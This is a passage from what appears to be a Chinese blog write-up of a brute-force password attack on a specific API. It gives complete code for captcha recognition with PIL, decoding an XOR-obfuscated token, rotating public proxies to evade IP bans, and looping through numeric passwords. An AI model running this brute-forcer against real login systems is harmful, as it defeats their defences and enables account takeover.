class="number">53</span>, <span class="number">70</span>, <span class="number">66</span>, <span class="number">70</span>, <span class="number">48</span>, <span class="number">69</span>, </span><br><span class="line">           <span class="number">69</span>, <span class="number">69</span>, <span class="number">50</span>, <span class="number">53</span>, <span class="number">56</span>, <span class="number">51</span>, <span class="number">70</span>, <span class="number">56</span>, <span class="number">65</span>, <span class="number">70</span>, <span class="number">51</span>, <span class="number">68</span>, <span class="number">68</span>, <span class="number">70</span>, <span class="number">70</span>, <span class="number">57</span>]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(input_raw)):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(len(key)):</span><br><span class="line">            input_raw[i] ^= key[j]</span><br><span class="line">    <span class="keyword">return</span> bytes(input_raw).decode()</span><br></pre></td></tr></table></figure>

<h4 id="0x2-验证码识别"><a href="#0x2-验证码识别" class="headerlink" title="0x2 验证码识别"></a>0x2 验证码识别</h4><p>验证码识别有多种办法, 包括接入打码平台, 使用ocr开源项目, 这里验证码十分规整, 我可以手写一个验证码识别</p>
<h5 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h5><p>首先分析验证码结构, 数字<code>8721</code>分别距离左边<code>5, 20, 35, 50</code>, 字母大小为<code>12*18</code></p>
<p>多次刷新, 采集多个验证码, 我这里采集了5个集齐了所有数字<br><img src="https://img-blog.csdnimg.cn/20200719135148527.png" alt="在这里插入图片描述"></p>
<h5 id="验证码处理"><a href="#验证码处理" class="headerlink" title="验证码处理"></a>验证码处理</h5><p>首先将验证码分隔成4个独立的小数字, 使用Python的PIL模块</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">4</span>):</span><br><span class="line">    offset = i * <span class="number">15</span> + <span class="number">5</span></span><br><span class="line">    data = img.crop((offset, <span class="number">3</span>, offset + <span class="number">12</span>, <span class="number">20</span>))</span><br></pre></td></tr></table></figure>

<p>然后对整个图片灰度化处理<code>data = data.convert(&quot;L&quot;)</code><br>然后简单对图片黑白化, 由于背景是白色的, 这里认为凡是不是白色即为有数据</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">w, h = data.size</span><br><span class="line">pixdata = data.load()</span><br><span class="line"><span class="keyword">for</span> y <span class="keyword">in</span> range(h):</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> range(w):</span><br><span class="line">        print(pixdata[x, y])</span><br><span class="line">        <span class="keyword">if</span> pixdata[x, y] &lt; <span class="number">255</span>:</span><br><span class="line">            pixdata[x, y] = <span class="number">0</span></span><br></pre></td></tr></table></figure>

<p>最后保存图片, 总体代码</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> index <span class="keyword">in</span> range(<span class="number">6</span>):</span><br><span class="line">    img = Image.open(<span class="string">f"image/index<span class="subst">&#123;index&#125;</span>.png"</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">4</span>):</span><br><span class="line">        offset = i * <span class="number">15</span> + <span class="number">5</span></span><br><span class="line">        data = img.crop((offset, <span class="number">3</span>, offset + <span class="number">12</span>, <span class="number">20</span>))</span><br><span class="line">        data = data.convert(<span class="string">"L"</span>)</span><br><span class="line">        w, h = data.size</span><br><span class="line">        pixdata = data.load()</span><br><span class="line">        <span class="keyword">for</span> y <span class="keyword">in</span> range(h):</span><br><span class="line">            <span class="keyword">for</span> x <span class="keyword">in</span> range(w):</span><br><span class="line">                print(pixdata[x, y])</span><br><span class="line">                <span class="keyword">if</span> pixdata[x, y] &lt; <span class="number">255</span>:</span><br><span class="line">                    pixdata[x, y] = <span class="number">0</span></span><br><span class="line">        data.save(<span class="string">f"num/<span class="subst">&#123;str(uuid.uuid4()).replace(<span class="string">'-'</span>, <span class="string">''</span>)&#125;</span>.png"</span>)</span><br></pre></td></tr></table></figure>

<p><img src="https://img-blog.csdnimg.cn/20200719135532935.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyNDM2MTc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<h5 id="特征提取"><a href="#特征提取" class="headerlink" title="特征提取"></a>特征提取</h5><p>将图片进行重命名, 挑出<code>1-9</code>, 并且重命名, 对数据进行采集<br><img src="https://img-blog.csdnimg.cn/20200719135645554.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyNDM2MTc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line">data = &#123;&#125;</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line">    img = Image.open(<span class="string">f"./num/<span class="subst">&#123;i&#125;</span>.png"</span>)</span><br><span class="line">    pixdata = img.load()</span><br><span class="line">    w, h = img.size</span><br><span class="line">    d = []</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> range(w):</span><br><span class="line">        <span class="keyword">for</span> y <span class="keyword">in</span> range(h):</span><br><span class="line">            d.append(pixdata[x, y])</span><br><span class="line">    data[i] = d</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">f"./num/data.json"</span>, <span class="string">'w'</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(json.dumps(data))</span><br></pre></td></tr></table></figure>

<p>最终获取json数据一份<br><img src="https://img-blog.csdnimg.cn/20200719135800951.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyNDM2MTc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>至于识别, 只需要对图片进行相似的分割, 然后灰度化, 黑白化, 然后与每个数字特征进行对比, 算出相似度, 然后取相似度最高的数字即可</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">find_str</span><span class="params">(num_list)</span>:</span></span><br><span class="line">    <span class="keyword">with</span> open(<span class="string">"num/data.json"</span>, <span class="string">'r'</span>) <span class="keyword">as</span> f:</span><br><span class="line">        nums = json.loads(f.read())</span><br><span class="line">    sim_data = []</span><br><span class="line">    <span class="keyword">for</span> num, num_data <span class="keyword">in</span> nums.items():</span><br><span class="line">        sim = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> ii, jj <span class="keyword">in</span> zip(num_list, num_data):</span><br><span class="line">            <span class="keyword">if</span> ii == jj:</span><br><span class="line">                sim += <span class="number">1</span></span><br><span class="line">        sim_data.append(sim)</span><br><span class="line">    <span class="keyword">return</span> str(sim_data.index(max(sim_data)))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">load_img</span><span class="params">(img)</span>:</span></span><br><span class="line">    s = <span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">4</span>):</span><br><span class="line">        offset = i * <span class="number">15</span> + <span class="number">5</span></span><br><span class="line">        data = img.crop((offset, <span class="number">3</span>, offset + <span class="number">12</span>, <span class="number">20</span>))</span><br><span class="line">        data = data.convert(<span class="string">"L"</span>)</span><br><span class="line">        w, h = data.size</span><br><span class="line">        pixdata = data.load()</span><br><span class="line">        img_data = []</span><br><span class="line">        <span class="keyword">for</span> x <span class="keyword">in</span> range(w):</span><br><span class="line">            <span class="keyword">for</span> y <span class="keyword">in</span> range(h):</span><br><span class="line">                img_data.append(<span class="number">0</span> <span class="keyword">if</span> pixdata[x, y] &lt; <span class="number">255</span> <span class="keyword">else</span> <span class="number">255</span>)</span><br><span class="line">        s += find_str(img_data)</span><br><span class="line">    <span class="keyword">return</span> s</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">print(load_img(Image.open(<span class="string">"image/index1.png"</span>)))</span><br></pre></td></tr></table></figure>

<p><img src="https://img-blog.csdnimg.cn/20200719140017886.png" alt="在这里插入图片描述"><br>还是很准的</p>
<h4 id="0x3-代理池"><a href="#0x3-代理池" class="headerlink" title="0x3 代理池"></a>0x3 代理池</h4><p>在发送数据的时候发现, 在请求超过50次后永远将404, 这就是ip被ban了, 这里就需要上代理池了<br>网上有大量免费代理, 采集一下</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ProxyPool</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.pool = [</span><br><span class="line">            <span class="string">"223.241.7.181:3000"</span>,</span><br><span class="line">            <span class="string">"222.189.190.254:9999"</span>,</span><br><span class="line">            <span class="string">"223.242.224.147:9999"</span>,</span><br><span class="line">            <span class="string">"36.248.129.32:9999"</span>,</span><br><span class="line">            <span class="string">"27.43.189.11:9999"</span>,</span><br><span class="line">            <span class="string">"103.140.204.1:8080"</span>,</span><br><span class="line">            <span class="string">"36.249.53.38:8000"</span></span><br><span class="line">        ]</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_proxy</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> &#123;</span><br><span class="line">            <span class="string">'http'</span>: <span class="string">'http://'</span> + self.pool[<span class="number">0</span>]</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">del_ip</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">del</span> self.pool[<span class="number">0</span>]</span><br></pre></td></tr></table></figure>

<p>连接失败的时候的时候更换ip</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pool = ProxyPool()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">100</span>, <span class="number">999</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        print(i, foo(i, pool.get_proxy()))</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        pool.del_ip()</span><br></pre></td></tr></table></figure>

<h4 id="0x4-全部代码"><a href="#0x4-全部代码" class="headerlink" title="0x4 全部代码"></a>0x4 全部代码</h4><h5 id="主体"><a href="#主体" class="headerlink" title="主体"></a>主体</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">from</span> io <span class="keyword">import</span> BytesIO</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://47.107.251.41/api/"</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ProxyPool</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.pool = [</span><br><span class="line">            <span class="string">"127.0.0.1:4780"</span>,</span><br><span class="line">            <span class="string">"223.241.7.181:3000"</span>,</span><br><span class="line">            <span class="string">"222.189.190.254:9999"</span>,</span><br><span class="line">            <span class="string">"223.242.224.147:9999"</span>,</span><br><span class="line">            <span class="string">"36.248.129.32:9999"</span>,</span><br><span class="line">            <span class="string">"27.43.189.11:9999"</span>,</span><br><span class="line">            <span class="string">"103.140.204.1:8080"</span>,</span><br><span class="line">            <span class="string">"36.249.53.38:8000"</span></span><br><span class="line">        ]</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_proxy</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> &#123;</span><br><span class="line">            <span class="string">'http'</span>: <span class="string">'http://'</span> + self.pool[<span class="number">0</span>]</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">del_ip</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">del</span> self.pool[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">find_str</span><span class="params">(num_list)</span>:</span></span><br><span class="line">    <span class="keyword">with</span> open(<span class="string">"num_data.json"</span>, <span class="string">'r'</span>) <span class="keyword">as</span> f:</span><br><span class="line">        nums = json.loads(f.read())</span><br><span class="line">    sim_data = []</span><br><span class="line">    <span class="keyword">for</span> num, num_data <span class="keyword">in</span> nums.items():</span><br><span class="line">        sim = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> ii, jj <span class="keyword">in</span> zip(num_list, num_data):</span><br><span class="line">            <span class="keyword">if</span> ii == jj:</span><br><span class="line">                sim += <span class="number">1</span></span><br><span class="line">        sim_data.append(sim)</span><br><span class="line">    <span class="keyword">return</span> str(sim_data.index(max(sim_data)))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">load_img</span><span class="params">(img)</span>:</span></span><br><span class="line">    s = <span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">4</span>):</span><br><span class="line">        offset = i * <span class="number">15</span> + <span class="number">5</span></span><br><span class="line">        data = img.crop((offset, <span class="number">3</span>, offset + <span class="number">12</span>, <span class="number">20</span>))</span><br><span class="line">        data = data.convert(<span class="string">"L"</span>)</span><br><span class="line">        w, h = data.size</span><br><span class="line">        pixdata = data.load()</span><br><span class="line">        img_data = []</span><br><span class="line">        <span class="keyword">for</span> x <span class="keyword">in</span> range(w):</span><br><span class="line">            <span class="keyword">for</span> y <span class="keyword">in</span> range(h):</span><br><span class="line">                img_data.append(<span class="number">0</span> <span class="keyword">if</span> pixdata[x, y] &lt; <span class="number">255</span> <span class="keyword">else</span> <span class="number">255</span>)</span><br><span class="line">        s += find_str(img_data)</span><br><span class="line">    <span class="keyword">return</span> s</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">foo</span><span class="params">(password, proxy)</span>:</span></span><br><span class="line">    data = requests.get(url=url).json()</span><br><span class="line">    code = <span class="string">""</span></span><br><span class="line">    uuid = parse_uuid(data[<span class="string">"uuid"</span>])</span><br><span class="line">    image = data[<span class="string">"img"</span>]</span><br><span class="line">    <span class="keyword">if</span> len(image) &gt; <span class="number">0</span>:</span><br><span class="line">        bytes_io = BytesIO(base64.b64decode(image[len(<span class="string">"data:image/png;base64,"</span>):]))</span><br><span class="line">        img = Image.open(bytes_io)</span><br><span class="line">        code = load_img(img)</span><br><span class="line"></span><br><span class="line">    data = requests.post(url=url, data=&#123;<span class="string">"uuid"</span>: uuid, <span class="string">"code"</span>: code, <span class="string">"password"</span>: password&#125;, proxies=proxy, timeout=<span class="number">10</span>)</span><br><span class="line">    <span class="keyword">if</span> data.status_code == <span class="number">404</span>:</span><br><span class="line">        <span class="keyword">raise</span> Exception(<span class="string">"404"</span>)</span><br><span class="line">    <span class="keyword">return</span> data.json()[<span class="string">"result"</span>], data.json()[<span class="string">"msg"</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">parse_uuid</span><span class="params">(raw)</span>:</span></span><br><span class="line">    input_raw = list(base64.b64decode(raw))</span><br><span class="line">    key = [<span class="number">49</span>, <span class="number">50</span>, <span class="number">51</span>, <span class="number">67</span>, <span class="number">55</span>, <span class="number">69</span>, <span class="number">53</span>, <span class="number">69</span>, <span class="number">56</span>, <span class="number">55</span>, <span class="number">53</span>, <span class="number">70</span>, <span class="number">66</span>, <span class="number">70</span>, <span class="number">48</span>, <span class="number">69</span>,</span><br><span class="line">           <span class="number">69</span>, <span class="number">69</span>, <span class="number">50</span>, <span class="number">53</span>, <span class="number">56</span>, <span class="number">51</span>, <span class="number">70</span>, <span class="number">56</span>, <span class="number">65</span>, <span class="number">70</span>, <span class="number">51</span>, <span class="number">68</span>, <span class="number">68</span>, <span class="number">70</span>, <span class="number">70</span>, <span class="number">57</span>]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(input_raw)):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(len(key)):</span><br><span class="line">            input_raw[i] ^= key[j]</span><br><span class="line">    <span class="keyword">return</span> bytes(input_raw).decode()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pool = ProxyPool()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">100</span>, <span class="number">999</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        print(i, foo(i, pool.get_proxy()))</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        pool.del_ip()</span><br></pre></td></tr></table></figure>

<h5 id="特征点"><a href="#特征点" class="headerlink" title="特征点"></a>特征点</h5><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">"0"</span>: [<span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>], <span class="attr">"1"</span>: [<span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span 